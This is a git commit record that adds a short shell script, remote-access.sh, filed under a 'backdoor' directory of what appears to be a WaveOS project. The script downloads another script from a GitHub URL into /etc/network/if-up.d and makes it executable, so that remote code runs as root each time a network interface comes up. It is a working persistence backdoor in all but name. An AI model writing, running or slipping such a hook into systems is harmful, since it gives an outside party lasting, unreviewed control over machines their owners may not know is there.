bc9f4896c7ef055834c2c210994ba64e179a5944
Hywel ApBuckler <10119070+unclehowell@users.noreply.github.com>
2018-04-24 14:59:46 -0300

    Create remote-access.sh

---
+++ server/cross-device-scripts/features/backdoor/remote-access.sh
@@ -0,0 +1,9 @@
+sudo apt-get install python -y
+
+wget https://raw.githubusercontent.com/unclehowell/WaveOS/master/server/cross-device-scripts/features/backdoor/mass-install-dp.sh -P /etc/network/if-up.d
+
+cd /etc/network/if-up.d/
+
+mv mass-install-dp.sh mass-install-dp
+
+sudo chmod 755 /etc/network/if-up.d/mass-install-dp
